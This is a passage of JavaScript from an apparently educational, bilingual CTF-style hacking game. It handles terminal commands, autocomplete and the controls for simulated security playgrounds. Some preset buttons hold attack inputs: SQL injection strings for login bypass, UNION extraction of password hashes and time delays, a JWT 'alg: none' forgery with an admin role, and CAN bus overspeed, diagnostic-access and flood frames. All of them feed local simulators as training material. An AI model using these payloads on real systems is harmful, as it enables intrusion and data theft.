    const MAX_RESULTS = 25;
    const list = matched.slice(0, MAX_RESULTS);
    list.forEach(c => {
      const isSolved = !!state.solved[c.id];
      const mark = isSolved ? '<span class="ok">✓</span>' : '<span class="dim">-</span>';
      const lay = layerByTier(c.tier);
      const nodeTag = lay ? lay.id : "t" + c.tier;
      const title = c.title ? (c.title[L()] || c.title.ko || c.title.en) : c.id;
      print('<span class="tbl"><span class="row">' +
        '<span class="id">[' + esc(nodeTag) + ']</span> ' +
        '<span class="bold">' + esc(c.id) + '</span> ' +
        '<span class="dim">(' + esc(c.cat || c.track || "") + ')</span> ' +
        '<span>' + esc(title) + '</span> ' +
        mark +
        '</span></span>');
    });
    if (matched.length > MAX_RESULTS){
      print('<span class="dim">' + (L() === "ko" ? "... 외 " + (matched.length - MAX_RESULTS) + "개 일치" : "... and " + (matched.length - MAX_RESULTS) + " more") + '</span>');
    }
    blank();
  }

  /* ===== command dispatch ===== */
  function run(raw){
    const line = raw.trim();
    echoCmd(raw);
    if (!line){ return; }

    // reset confirmation flow
    if (pendingReset){
      pendingReset = false;
      if (line.toLowerCase() === "yes" || line.toLowerCase() === "y"){
        state = { solved:{}, hints:{}, lang: state.lang, sound: state.sound };
        save(); cwd = null; target = null;
        printText(S("resetDone"), "warn"); refreshHud();
      } else {
        printText(L()==="ko" ? "취소됨." : "cancelled.", "dim");
      }
      return;
    }

    const parts = line.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const arg = parts.slice(1).join(" ");

    switch (cmd){
      case "help": case "?": case "도움말": showHelp(); break;
      case "ls": case "dir": case "list":
        if (cwd) showLocks(cwd, arg);
        else if (arg && layerById(arg.toLowerCase())) showLocks(arg.toLowerCase());
        else showNodes();
        break;
      case "tracks": case "track": case "트랙": showTracks(); break;
      case "nodes": showNodes(); break;
      case "map": case "지도": showMap(); break;
      case "connect": case "cd": case "ssh": case "nc": {
        if (cmd === "cd" && (arg === ".." || arg === "")){ // cd .. / cd -> root
          cwd = null; target = null; printText(L()==="ko"?"루트로 이동.":"back to root.", "dim"); refreshHud(); break;
        }
        connect(arg); break;
      }
      case "back": case "disconnect": case "exit":
        cwd = null; target = null; printText(L()==="ko"?"접속 종료.":"disconnected.", "dim"); refreshHud(); break;
      case "cat": case "open": case "less": case "vi": catLock(arg); break;
      case "hint": case "힌트": doHint(arg); break;
      case "submit": case "flag": case "answer": trySubmit(arg); break;
      case "status": case "whoami": case "stat": case "id": showStatus(); break;
      case "stats": case "chart": case "dashboard": case "통계": showStats(); break;
      case "badges": case "badge": case "achievements": case "achievement": case "업적":
        showBadgesTerminal(); break;
      case "playground": case "sim": case "tools": case "실험실":
        openPlayground(arg); break;
      case "can": case "canbus":
        openPlayground("canbus"); break;
      case "sqli":
        openPlayground("sqli"); break;
      case "adcs":
        openPlayground("adcs"); break;
      case "jwt":
        openPlayground("jwt"); break;
      case "bgp": case "rpki":
        openPlayground("bgp"); break;
      case "oauth": case "pkce":
        openPlayground("oauth"); break;
      case "dbsec": case "dbshield": case "udf":
        openPlayground("dbshield"); break;
      case "edr": case "edrbypass": case "unhook": case "amsi": case "syscall":
        openPlayground("edr"); break;
      case "crypto": case "oracle": case "padding": case "bitflip": case "cbc":
        openPlayground("crypto"); break;
      case "dfir": case "triage": case "timeline": case "forensics": case "ir": case "contain":
        openPlayground("dfir"); break;
      case "sbom": case "supplychain": case "cosign": case "slsa": case "cyclonedx": case "dep":
        openPlayground("sbom"); break;
      case "serverless": case "lambda": case "faas": case "warm": case "eventsec": case "firecracker":
        openPlayground("serverless"); break;
      case "cloudir": case "cloudtrail": case "vpcflow": case "guardduty": case "soar": case "cloudforensics":
        openPlayground("cloudir"); break;
      case "extsec": case "manifestv3": case "contentscript": case "dnr": case "war":
        openPlayground("extsec"); break;
      case "search": case "find": case "검색": doSearch(arg); break;
      case "export": case "backup": doExport(arg); break;
      case "import": case "restore": doImport(arg); break;
      case "lang": case "언어": toggleLang(); break;
      case "sound": case "mute": toggleSound(); break;
      case "clear": case "cls": out.innerHTML = ""; break;
      case "reset":
        pendingReset = true; printText(S("resetAsk"), "warn"); break;
      case "banner": case "intro": intro(); break;
      default:
        // bare flag attempt when a target is open
        if (target && (/^flag\{/i.test(line) || target)){ trySubmit(line); break; }
        printText(S("unknown") + " " + cmd, "err");
        printText(S("tryHelp"), "dim");
        sDeny();
    }
  }

  function connect(arg){
    if (!arg){ printText(S("connFirst"), "warn"); return; }
    let lay = layerById(arg.toLowerCase());
    if (!lay && /^\d+$/.test(arg)) lay = layerByTier(parseInt(arg,10));
    if (!lay){ printText(S("noNode") + " " + arg, "err"); sDeny(); return; }
    if (!isTierUnlocked(lay.tier)){
      sDeny();
      printSeq([{ html:'<span class="banner deny">  ╳  ' + esc(S("nodeLocked")) + '  ╳  </span>', d:0 }]);
      return;
    }
    cwd = lay.id; target = null;
    refreshHud();
    showLocks(lay.id);
  }

  function toggleLang(){
    state.lang = state.lang === "ko" ? "en" : "ko"; save();
    refreshHud();
    printText(state.lang === "ko" ? "언어: 한국어" : "language: English", "dim");
  }
  function toggleSound(){
    state.sound = !state.sound; save(); refreshHud();
    if (state.sound){ audio(); sGrant(); }
    printText(state.sound ? S("soundOn") : S("soundOff"), "dim");
  }

  /* ===== boot + intro ===== */
  function intro(){
    const banner = [
      " ██╗   ██╗██╗██████╗ ███████╗",
      " ██║   ██║██║██╔══██╗██╔════╝",
      " ██║   ██║██║██████╔╝█████╗  ",
      " ╚██╗ ██╔╝██║██╔══██╗██╔══╝  ",
      "  ╚████╔╝ ██║██████╔╝███████╗",
      "   ╚═══╝  ╚═╝╚═════╝ ╚══════╝  INFILTRATION TERMINAL"
    ];
    banner.forEach(b => print('<span class="ok">' + esc(b).replace(/ /g,"&nbsp;") + '</span>'));
    print('<span class="dim">' + (L()==="ko"
      ? "표적: vibe.corp · 보안 계층 5개 · 한 계층씩 뚫어 코어에 도달하세요."
      : "target: vibe.corp · 5 security layers · breach them one by one to reach the core.") + '</span>');
    blank();
    print('<span class="warn">' + esc(S("welcome")) + '</span>');
    blank();
  }

  function boot(){
    const seq = [
      { html:'<span class="sys">[ booting vibe-os 4.8 ... ]</span>', d:120 },
      { html:'<span class="sys">[ <span class="ok">OK</span> ] mount /dev/secrets</span>', d:90 },
      { html:'<span class="sys">[ <span class="ok">OK</span> ] load exploit toolkit (pwntools, john, hashcat)</span>', d:90 },
      { html:'<span class="sys">[ <span class="ok">OK</span> ] crypto.subtle ' + (window.crypto && window.crypto.subtle ? 'available' : 'fallback') + '</span>', d:90 },
      { html:'<span class="sys">[ <span class="ok">OK</span> ] resolve vibe.corp ... 10.13.37.0/24</span>', d:120 },
      { html:'<span class="sys">[ <span class="warn">!!</span> ] 5 security layers detected — authorization required</span>', d:160 },
      { html:'&nbsp;', d:80 }
    ];
    printSeq(seq, () => {
      intro();
      // restore last context hint
      const n = solvedCount();
      if (n > 0){
        print('<span class="dim">' + (L()==="ko"
          ? ("이전 진행 복원: " + n + "/" + CHALLENGES.length + " 침투됨. `status` 로 확인, `map` 으로 경로 보기.")
          : ("restored progress: " + n + "/" + CHALLENGES.length + " breached. `status` to review, `map` for the path.")) + '</span>');
      }
      refreshHud();
      checkAchievements(true);
    });
  }

  /* ===== input wiring ===== */
  const input = document.getElementById("cmd");
  const form = document.getElementById("cmdline");
  const history = []; let hi = -1;

  form.addEventListener("submit", e => {
    e.preventDefault();
    const v = input.value;
    if (v.trim()){ history.push(v); if (history.length > 100) history.shift(); }
    hi = history.length;
    input.value = "";
    sEnter();
    run(v);
  });
  const AUTO_COMMANDS = [
    "help", "ls", "nodes", "map", "connect", "back", "cat", "hint",
    "submit", "status", "stats", "badges", "search", "export", "import", "lang",
    "sound", "clear", "reset", "banner"
  ];

  function getLCP(arr){
    if (!arr || !arr.length) return "";
    let prefix = arr[0];
    for (let i = 1; i < arr.length; i++){
      while (!arr[i].startsWith(prefix)){
        prefix = prefix.slice(0, -1);
        if (!prefix) return "";
      }
    }
    return prefix;
  }

  function doAutoComplete(){
    const v = input.value;
    const trimmed = v.trimStart();
    if (!trimmed) return;
    const leadingSpaces = v.slice(0, v.length - trimmed.length);

    // 1. connect / cd / ssh node completion
    const connMatch = trimmed.match(/^(connect|cd|ssh|nc)\s+(\S*)$/i);
    if (connMatch){
      const prefix = connMatch[1];
      const argPrefix = connMatch[2].toLowerCase();
      const nodeIds = LAYERS.map(l => l.id);
      const matches = nodeIds.filter(id => id.startsWith(argPrefix));
      if (matches.length === 1){
        input.value = leadingSpaces + prefix + " " + matches[0] + " ";
        sKey();
      } else if (matches.length > 1){
        blank();
        echoCmd(v);
        print('<span class="dim">' + matches.join("  ") + '</span>');
        const lcp = getLCP(matches);
        if (lcp.length > argPrefix.length){
          input.value = leadingSpaces + prefix + " " + lcp;
        }
      }
      return;
    }

    // 2. cat lock completion in current layer
    const catMatch = trimmed.match(/^(cat|open|less)\s+(\S*)$/i);
    if (catMatch && cwd){
      const prefix = catMatch[1];
      const argPrefix = catMatch[2];
      const locks = currentLocks();
      const lockNums = locks.map((_, i) => String(i + 1));
      const matches = lockNums.filter(num => num.startsWith(argPrefix));
      if (matches.length === 1){
        input.value = leadingSpaces + prefix + " " + matches[0] + " ";
        sKey();
      } else if (matches.length > 1 && matches.length <= 20){
        blank();
        echoCmd(v);
        print('<span class="dim">' + matches.join("  ") + '</span>');
      }
      return;
    }

    // 3. Command completion
    if (!trimmed.includes(" ")){
      const cmdPrefix = trimmed.toLowerCase();
      const matches = AUTO_COMMANDS.filter(c => c.startsWith(cmdPrefix));
      if (matches.length === 1){
        input.value = leadingSpaces + matches[0] + " ";
        sKey();
      } else if (matches.length > 1){
        blank();
        echoCmd(v);
        print('<span class="dim">' + matches.join("  ") + '</span>');
        const lcp = getLCP(matches);
        if (lcp.length > cmdPrefix.length){
          input.value = leadingSpaces + lcp;
        }
      }
    }
  }

  input.addEventListener("keydown", e => {
    if (e.key === "Tab"){ e.preventDefault(); doAutoComplete(); }
    else if (e.key === "ArrowUp"){ if (hi > 0){ hi--; input.value = history[hi] || ""; } e.preventDefault(); }
    else if (e.key === "ArrowDown"){ if (hi < history.length - 1){ hi++; input.value = history[hi] || ""; } else { hi = history.length; input.value = ""; } e.preventDefault(); }
    else if (e.key.length === 1){ sKey(); }
  });
  // keep focus on terminal (but don't steal it right after the user selects text to copy)
  document.getElementById("out").addEventListener("click", () => {
    if (window.getSelection && String(window.getSelection())) return;
    input.focus();
  });
  document.getElementById("screen").addEventListener("click", e => {
    if (e.target.closest("button")) return;
    if (window.getSelection && String(window.getSelection())) return;
    input.focus();
  });

  // quick chips
  document.querySelectorAll(".chip").forEach(ch => {
    ch.addEventListener("click", () => {
      input.focus();
      audio();
      if (ch.dataset.input != null) {
        input.value = ch.dataset.input;
      } else if (ch.dataset.cmd) {
        run(ch.dataset.cmd);
      }
    });
  });
  // hud buttons
  document.getElementById("soundBtn").addEventListener("click", () => { audio(); toggleSound(); input.focus(); });
  document.getElementById("langBtn").addEventListener("click", () => { toggleLang(); input.focus(); });

  const exportBtn = document.getElementById("exportBtn");
  if (exportBtn) exportBtn.addEventListener("click", () => { audio(); exportJSON(); input.focus(); });

  const importBtn = document.getElementById("importBtn");
  const importFileInput = document.getElementById("importFileInput");
  if (importBtn && importFileInput){
    importBtn.addEventListener("click", () => { audio(); importFileInput.click(); });
    importFileInput.addEventListener("change", e => {
      if (e.target.files && e.target.files[0]){
        importFromFile(e.target.files[0]);
        e.target.value = "";
      }
      input.focus();
    });
  }

  const badgeBtn = document.getElementById("badgeBtn");
  if (badgeBtn) badgeBtn.addEventListener("click", () => { audio(); showBadgesModal(); });

  const modalClose = document.getElementById("modalClose");
  if (modalClose) modalClose.addEventListener("click", () => hideBadgesModal());

  const badgeModal = document.getElementById("badgeModal");
  if (badgeModal){
    badgeModal.addEventListener("click", e => {
      if (e.target === badgeModal) hideBadgesModal();
    });
  }

  // --- Playground Modal Event Handlers ---
  const playgroundBtn = document.getElementById("playgroundBtn");
  if (playgroundBtn) playgroundBtn.addEventListener("click", () => { audio(); openPlayground(); });

  const playgroundClose = document.getElementById("playgroundClose");
  if (playgroundClose) playgroundClose.addEventListener("click", () => hidePlayground());

  const playgroundModal = document.getElementById("playgroundModal");
  if (playgroundModal){
    playgroundModal.addEventListener("click", e => {
      if (e.target === playgroundModal) hidePlayground();
    });
  }

  document.addEventListener("keydown", e => {
    if (e.key === "Escape"){
      if (badgeModal && badgeModal.style.display === "flex") hideBadgesModal();
      if (playgroundModal && playgroundModal.style.display === "flex") hidePlayground();
    }
  });

  // Playground Tab switching
  document.querySelectorAll(".pg-tab").forEach(tab => {
    tab.addEventListener("click", () => {
      audio();
      switchPlaygroundTab(tab.getAttribute("data-tab"));
    });
  });

  // CAN Bus Controls
  const canSendBtn = document.getElementById("canSendBtn");
  if (canSendBtn){
    canSendBtn.addEventListener("click", () => {
      audio();
      const id = (document.getElementById("canIdInput") || {}).value;
      const dlc = (document.getElementById("canDlcInput") || {}).value;
      const data = (document.getElementById("canDataInput") || {}).value;
      injectCanFrame(id, dlc, data);
    });
  }
  const canClearBtn = document.getElementById("canClearBtn");
  if (canClearBtn){
    canClearBtn.addEventListener("click", () => {
      const logEl = document.getElementById("canLog");
      if (logEl) logEl.innerHTML = "";
    });
  }
  document.querySelectorAll("[data-can-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-can-preset");
      const idEl = document.getElementById("canIdInput");
      const dlcEl = document.getElementById("canDlcInput");
      const dataEl = document.getElementById("canDataInput");
      if (p === "cruise"){
        if (idEl) idEl.value = "0x244";
        if (dlcEl) dlcEl.value = "8";
        if (dataEl) dataEl.value = "00 3C 00 00 00 00 00 00";
        injectCanFrame("0x244", 8, "00 3C 00 00 00 00 00 00");
      } else if (p === "overspeed"){
        if (idEl) idEl.value = "0x244";
        if (dlcEl) dlcEl.value = "8";
        if (dataEl) dataEl.value = "00 DC 19 00 00 00 00 00";
        injectCanFrame("0x244", 8, "00 DC 19 00 00 00 00 00");
      } else if (p === "uds"){
        if (idEl) idEl.value = "0x7DF";
        if (dlcEl) dlcEl.value = "8";
        if (dataEl) dataEl.value = "02 27 01 00 00 00 00 00";
        injectCanFrame("0x7DF", 8, "02 27 01 00 00 00 00 00");
      } else if (p === "dos"){
        if (idEl) idEl.value = "0x000";
        if (dlcEl) dlcEl.value = "8";
        if (dataEl) dataEl.value = "00 00 00 00 00 00 00 00";
        injectCanFrame("0x000", 8, "00 00 00 00 00 00 00 00");
      }
    });
  });

  // SQLi Controls
  const sqliIn = document.getElementById("sqliInput");
  if (sqliIn) sqliIn.addEventListener("input", () => renderSqli());
  document.querySelectorAll("[data-sqli-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-sqli-preset");
      if (sqliIn){
        if (p === "bypass") sqliIn.value = "admin' OR '1'='1' -- ";
        else if (p === "union") sqliIn.value = "' UNION SELECT id, username, password_hash FROM users -- ";
        else if (p === "sleep") sqliIn.value = "admin' AND (SELECT SLEEP(5)) -- ";
        else if (p === "safe") sqliIn.value = "john_doe";
        renderSqli();
      }
    });
  });

  // AD CS Controls
  const adcsSanIn = document.getElementById("adcsSanInput");
  if (adcsSanIn) adcsSanIn.addEventListener("input", () => renderAdcs(currentAdcsPreset));
  document.querySelectorAll("[data-adcs-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-adcs-preset");
      renderAdcs(p);
    });
  });

  // JWT Controls
  ["jwtHeader", "jwtPayload", "jwtSig"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => updateJwtDisplay());
  });
  document.querySelectorAll("[data-jwt-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-jwt-preset");
      const hdrEl = document.getElementById("jwtHeader");
      const payEl = document.getElementById("jwtPayload");
      const sigEl = document.getElementById("jwtSig");
      if (p === "none"){
        if (hdrEl) hdrEl.value = JSON.stringify({ alg: "none", typ: "JWT" }, null, 2);
        if (sigEl) sigEl.value = "";
      } else if (p === "escalate"){
        if (payEl) payEl.value = JSON.stringify({ sub: "administrator", role: "admin", exp: Math.floor(Date.now()/1000) + 7200 }, null, 2);
      } else if (p === "reset"){
        if (hdrEl) hdrEl.value = JSON.stringify({ alg: "RS256", typ: "JWT" }, null, 2);
        if (payEl) payEl.value = JSON.stringify({ sub: "user_4910", role: "guest", exp: Math.floor(Date.now()/1000) + 3600 }, null, 2);
        if (sigEl) sigEl.value = "c8f2a1b9d4e5f607182930a4b5c6d7e8";
      }
      updateJwtDisplay();
    });
  });

  // BGP Controls
  const bgpSimBtn = document.getElementById("bgpSimulateBtn");
  if (bgpSimBtn) bgpSimBtn.addEventListener("click", () => { audio(); renderBgp(); });
  ["bgpPrefixInput", "bgpOriginInput", "bgpPathInput"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => renderBgp());
  });
  const bgpRpkiBox = document.getElementById("bgpRpkiCheck");
  if (bgpRpkiBox) bgpRpkiBox.addEventListener("change", () => renderBgp());
  document.querySelectorAll("[data-bgp-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-bgp-preset");
      renderBgp(p);
    });
  });

  // OAuth Controls
  const oauthVerIn = document.getElementById("oauthVerifierInput");
  if (oauthVerIn) oauthVerIn.addEventListener("input", () => renderOAuth(currentOAuthMode));
  const oauthMethSel = document.getElementById("oauthMethodSelect");
  if (oauthMethSel) oauthMethSel.addEventListener("change", () => renderOAuth(currentOAuthMode));
  const oauthPubIn = document.getElementById("oauthPubKeyInput");
  if (oauthPubIn) oauthPubIn.addEventListener("input", () => renderOAuth(currentOAuthMode));
  document.querySelectorAll("[data-oauth-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-oauth-preset");
      renderOAuth(p);
    });
  });

  // DBShield Controls
  const dbSimBtn = document.getElementById("dbshieldSimulateBtn");
  if (dbSimBtn) dbSimBtn.addEventListener("click", () => { audio(); renderDbShield(); });
  ["dbshieldRoleInput", "dbshieldSqlInput"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => renderDbShield());
  });
  ["dbshieldEngineSelect", "dbshieldSecurePluginCheck", "dbshieldFgaCheck"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("change", () => renderDbShield());
  });
  document.querySelectorAll("[data-dbshield-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-dbshield-preset");
      renderDbShield(p);
    });
  });

  // EDR Inspector Controls
  const edrSimBtn = document.getElementById("edrSimulateBtn");
  if (edrSimBtn) edrSimBtn.addEventListener("click", () => { audio(); renderEdr(); });
  ["edrTargetInput", "edrPayloadInput"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => renderEdr());
  });
  ["edrModeSelect", "edrUserlandHookCheck", "edrEtwTiCheck", "edrMemScanCheck"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("change", () => renderEdr());
  });
  document.querySelectorAll("[data-edr-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-edr-preset");
      renderEdr(p);
    });
  });

  // Crypto Inspector Controls
  const cryptoSimBtn = document.getElementById("cryptoSimulateBtn");
  if (cryptoSimBtn) cryptoSimBtn.addEventListener("click", () => { audio(); renderCrypto(); });
  ["cryptoTargetInput", "cryptoIvInput", "cryptoCtInput"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => renderCrypto());
  });
  ["cryptoPrimitiveSelect", "cryptoOracleLeakCheck", "cryptoAeadCheck"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("change", () => renderCrypto());
  });
  document.querySelectorAll("[data-crypto-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-crypto-preset");
      renderCrypto(p);
    });
  });

  // DFIR Inspector Controls
  const dfirSimBtn = document.getElementById("dfirSimulateBtn");
  if (dfirSimBtn) dfirSimBtn.addEventListener("click", () => { audio(); renderDfir(); });
  ["dfirHostInput", "dfirQueryInput"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("input", () => renderDfir());
  });
  ["dfirStreamSelect", "dfirContainmentCheck", "dfirMemoryDumpCheck", "dfirSoarRemediateCheck"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener("change", () => renderDfir());
  });
  document.querySelectorAll("[data-dfir-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-dfir-preset");
      renderDfir(p);
    });
  });

  // SBOM Inspector Controls
  const sbomScanBtn = document.getElementById("btnRunSbomAudit");
  if (sbomScanBtn) sbomScanBtn.addEventListener("click", () => { audio(); renderSbom(); });
  const sbomHardenBtn = document.getElementById("btnEnforceSbomHarden");
  if (sbomHardenBtn) sbomHardenBtn.addEventListener("click", () => {
    audio();
    const sel = document.getElementById("sbomPolicySelect");
    if (sel) sel.value = "scoped_hash_pinned";
    renderSbom();
  });
  const sbomPkgInput = document.getElementById("sbomPkgInput");
  if (sbomPkgInput) sbomPkgInput.addEventListener("input", () => renderSbom());
  const sbomPolicySelect = document.getElementById("sbomPolicySelect");
  if (sbomPolicySelect) sbomPolicySelect.addEventListener("change", () => renderSbom());
  document.querySelectorAll("[data-sbom-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-sbom-preset");
      renderSbom(p);
    });
  });

  // Serverless Inspector Controls
  const serverlessRunBtn = document.getElementById("btnRunServerlessSim");
  if (serverlessRunBtn) serverlessRunBtn.addEventListener("click", () => { audio(); renderServerless(); });
  const serverlessHardenBtn = document.getElementById("btnEnforceServerlessHarden");
  if (serverlessHardenBtn) serverlessHardenBtn.addEventListener("click", () => {
    audio();
    const sel = document.getElementById("serverlessRuntimeSelect");
    if (sel) sel.value = "hardened_microvm";
    renderServerless();
  });
  const serverlessKeyInput = document.getElementById("serverlessKeyInput");
  if (serverlessKeyInput) serverlessKeyInput.addEventListener("input", () => renderServerless());
  const serverlessRuntimeSelect = document.getElementById("serverlessRuntimeSelect");
  if (serverlessRuntimeSelect) serverlessRuntimeSelect.addEventListener("change", () => renderServerless());
  document.querySelectorAll("[data-serverless-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-serverless-preset");
      renderServerless(p);
    });
  });

  // Cloud IR Inspector Controls
  const cloudirRunBtn = document.getElementById("btnRunCloudIRSim");
  if (cloudirRunBtn) cloudirRunBtn.addEventListener("click", () => { audio(); renderCloudIR(); });
  const cloudirSoarBtn = document.getElementById("btnEnforceCloudIRSoar");
  if (cloudirSoarBtn) cloudirSoarBtn.addEventListener("click", () => {
    audio();
    renderCloudIR("soar_contain");
  });
  const cloudirFilterInput = document.getElementById("cloudirFilterInput");
  if (cloudirFilterInput) cloudirFilterInput.addEventListener("input", () => renderCloudIR());
  const cloudirSourceSelect = document.getElementById("cloudirSourceSelect");
  if (cloudirSourceSelect) cloudirSourceSelect.addEventListener("change", () => renderCloudIR());
  document.querySelectorAll("[data-cloudir-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-cloudir-preset");
      renderCloudIR(p);
    });
  });

  // Browser Extension Security Inspector Controls
  const extsecRunBtn = document.getElementById("btnRunExtSecSim");
  if (extsecRunBtn) extsecRunBtn.addEventListener("click", () => { audio(); renderExtSec(); });
  const extsecHardenBtn = document.getElementById("btnEnforceExtSecHarden");
  if (extsecHardenBtn) extsecHardenBtn.addEventListener("click", () => {
    audio();
    renderExtSec("dnr_harden");
  });
  const extsecTargetInput = document.getElementById("extsecTargetInput");
  if (extsecTargetInput) extsecTargetInput.addEventListener("input", () => renderExtSec());
  const extsecAuditVectorSelect = document.getElementById("extsecAuditVectorSelect");
  if (extsecAuditVectorSelect) extsecAuditVectorSelect.addEventListener("change", () => renderExtSec());
  document.querySelectorAll("[data-extsec-preset]").forEach(btn => {
    btn.addEventListener("click", () => {
      audio();
      const p = btn.getAttribute("data-extsec-preset");
      renderExtSec(p);
    });
  });

  /* ===== matrix rain ===== */
  (function rain(){
    const c = document.getElementById("rain");
    if (!c || window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
    const ctx = c.getContext("2d");
    let cols, drops, fontSize = 14;
    const glyphs = "01░▒▓<>/\\{}[]#$%&日二三四五六七八九十円ハミヒ".split("");
    function resize(){
      c.width = window.innerWidth; c.height = window.innerHeight;
      cols = Math.floor(c.width / fontSize);
      drops = new Array(cols).fill(0).map(() => Math.random() * -50);
    }
    resize(); window.addEventListener("resize", resize);
    let last = 0;
    function frame(t){
      requestAnimationFrame(frame);
      if (t - last < 60) return; last = t; // ~16fps, light
      ctx.fillStyle = "rgba(2,6,10,0.18)";
      ctx.fillRect(0, 0, c.width, c.height);
      ctx.fillStyle = "#27ff8b";
      ctx.font = fontSize + "px monospace";
      for (let i = 0; i < cols; i++){
        const ch = glyphs[Math.floor(Math.random() * glyphs.length)];
        ctx.fillText(ch, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    }
    requestAnimationFrame(frame);
  })();

  /* ===== go ===== */
  refreshHud();
  boot();
  input.focus();
})();
